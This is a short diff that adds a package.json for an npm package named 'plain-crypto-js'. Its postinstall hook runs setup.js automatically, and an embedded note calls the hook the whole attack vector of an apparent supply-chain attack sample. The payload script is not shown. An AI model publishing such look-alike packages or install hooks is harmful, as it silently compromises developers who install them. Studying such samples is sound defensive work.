@@ -1,0 +1,11 @@
+{
+  "name": "plain-crypto-js",
+  "version": "4.2.1",
+  "description": "Cryptographic utilities for JavaScript",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node setup.js"
+  },
+  "license": "MIT",
+  "_note": "This postinstall hook is the entire attack vector. npm runs this automatically after installing the package. The victim never sees it fire."
+}
